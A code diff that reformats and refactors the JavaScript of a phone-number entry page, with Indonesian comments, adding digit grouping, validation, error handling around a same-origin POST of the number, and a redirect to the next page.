@@ -15,14 +15,14 @@ document.getElementById("clearBtn");
 const errorBox =
 document.getElementById("errorBox");
 
-/* FADE IN */ 
+
+/* FADE IN */
 window.addEventListener("load", () => {
 
-    document.body.classList.add(
-    "fade-in"
-    );
+    document.body.classList.add("fade-in");
 
 });
+
 
 /* AUTO FOCUS */
 window.onload = () => {
@@ -31,100 +31,82 @@ window.onload = () => {
 
 };
 
+
 /* FORMAT NOMOR */
-phoneInput.addEventListener(
-"input",
-(e) => {
+phoneInput.addEventListener("input", (e) => {
 
     /* ANGKA SAJA */
-    let angka =
-    e.target.value.replace(
-    /\D/g,
-    ''
-    );
+    let angka = e.target.value.replace(/\D/g, '');
 
-    /* MAX */
-    angka =
-    angka.substring(0,13);
+    /* MAX 13 ANGKA */
+    angka = angka.substring(0, 13);
 
     let hasil = "";
 
-    /* 812 */
-    if(angka.length > 0){
+    /* 3 ANGKA PERTAMA */
+    if (angka.length > 0) {
 
-        hasil +=
-        angka.substring(0,3);
-
-    }
-
-    /* 812-3456 */
-    if(angka.length >= 3){
-
-        hasil += "-" +
-        angka.substring(3,7);
+        hasil += angka.substring(0, 3);
 
     }
 
-    /* 812-3456-7890 */
-    if(angka.length >= 7){
+    /* 4 ANGKA BERIKUTNYA */
+    if (angka.length > 3) {
 
-        hasil += "-" +
-        angka.substring(7,13);
+        hasil += "-" + angka.substring(3, 7);
+
+    }
+
+    /* SISA ANGKA */
+    if (angka.length > 7) {
+
+        hasil += "-" + angka.substring(7, 13);
 
     }
 
     e.target.value = hasil;
 
+
     /* SHOW / HIDE X */
-    if(hasil.length > 0){
+    if (hasil.length > 0) {
 
-        clearBtn.style.display =
-        "flex";
+        clearBtn.style.display = "flex";
 
-    }else{
+    } else {
 
-        clearBtn.style.display =
-        "none";
+        clearBtn.style.display = "none";
 
     }
 
+
     /* HIDE ERROR */
-    errorBox.classList.remove(
-    "show"
-    );
+    errorBox.classList.remove("show");
 
 });
 
+
 /* CLEAR INPUT */
-clearBtn.addEventListener(
-"click",
-() => {
+clearBtn.addEventListener("click", () => {
 
     phoneInput.value = "";
 
-    clearBtn.style.display =
-    "none";
+    clearBtn.style.display = "none";
 
-    errorBox.classList.remove(
-    "show"
-    );
+    errorBox.classList.remove("show");
 
     phoneInput.focus();
 
 });
 
+
 /* KEYBOARD ANGKA */
-phoneInput.setAttribute(
-"inputmode",
-"numeric"
-);
+phoneInput.setAttribute("inputmode", "numeric");
+
 
 /* ENTER */
-phoneInput.addEventListener(
-"keypress",
-(e)=>{
+phoneInput.addEventListener("keypress", (e) => {
 
-    if(e.key === "Enter"){
+    if (e.key === "Enter") {
 
         lanjutBtn.click();
 
@@ -132,85 +114,118 @@ phoneInput.addEventListener(
 
 });
 
+
 /* LANJUT */
-lanjutBtn.addEventListener(
-"click",
- async () => {
+lanjutBtn.addEventListener("click", async () => {
 
-/* AMBIL NOMOR */
-const nomor =
-phoneInput.value.replace(/\D/g, '');
+    /* AMBIL NOMOR TANPA FORMAT */
+    const nomor = phoneInput.value.replace(/\D/g, '');
 
-/* VALIDASI */
-if(
-    nomor.length < 9 ||
-    nomor.charAt(0) !== "8"
-){
 
-    if(navigator.vibrate){
-        navigator.vibrate([
-            120,
-            80,
-            120
-        ]);
+    /* VALIDASI */
+    if (
+        nomor.length < 9 ||
+        nomor.charAt(0) !== "8"
+    ) {
+
+        if (navigator.vibrate) {
+
+            navigator.vibrate([
+                120,
+                80,
+                120
+            ]);
+
+        }
+
+        errorBox.classList.add("show");
+
+        setTimeout(() => {
+
+            errorBox.classList.remove("show");
+
+        }, 2000);
+
+        phoneInput.focus();
+
+        return;
+
     }
 
-    errorBox.classList.add("show");
 
-    setTimeout(() => {
-        errorBox.classList.remove("show");
-    }, 2000);
-
-    phoneInput.focus();
-
-    return;
-}
-
-     /* FORMAT NOMOR */
-const nomorFormat = nomor.replace(
-    /^(\d{3})(\d{4})(\d+)$/,
-    '$1-$2-$3'
-);
-
-/* SIMPAN */
-localStorage.setItem("nmrx", nomorFormat);
-
-/* KIRIM */
-await fetch("/nmrx", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        nmrx: nomorFormat
-    })
-});
-     
-    /* SHOW LOADING */
-    loadingBox.style.display =
-    "flex";
-
-    /* PINDAH */
-    setTimeout(()=>{
-
-      /* FADE OUT */
-    document.body.classList.add(
-    "fade-out"
+    /* FORMAT NOMOR UNTUK DIKIRIM */
+    const nomorFormat = nomor.replace(
+        /^(\d{3})(\d{4})(\d+)$/,
+        '$1-$2-$3'
     );
 
-        window.location.href =
-        "pix.html";
 
-    },2000);
+    /* SIMPAN KE LOCAL STORAGE */
+    localStorage.setItem("nmrx", nomorFormat);
+
+
+    /* KIRIM KE SERVER */
+    try {
+
+        const response = await fetch("/nmrx", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                nmrx: nomorFormat
+
+            })
+
+        });
+
+
+        /* CEK RESPONSE */
+        if (!response.ok) {
+
+            throw new Error("Gagal mengirim nomor");
+
+        }
+
+
+        /* SHOW LOADING */
+        loadingBox.style.display = "flex";
+
+
+        /* PINDAH HALAMAN */
+        setTimeout(() => {
+
+            document.body.classList.add("fade-out");
+
+            window.location.href = "pix.html";
+
+        }, 2000);
+
+
+    } catch (error) {
+
+        console.error("Error:", error);
+
+        errorBox.classList.add("show");
+
+        setTimeout(() => {
+
+            errorBox.classList.remove("show");
+
+        }, 2000);
+
+    }
 
 });
 
-/* RESET LOADING */
-window.addEventListener(
-"pageshow",
-() => {
 
-    loadingBox.style.display =
-    "none";
+/* RESET LOADING */
+window.addEventListener("pageshow", () => {
+
+    loadingBox.style.display = "none";
 
 });
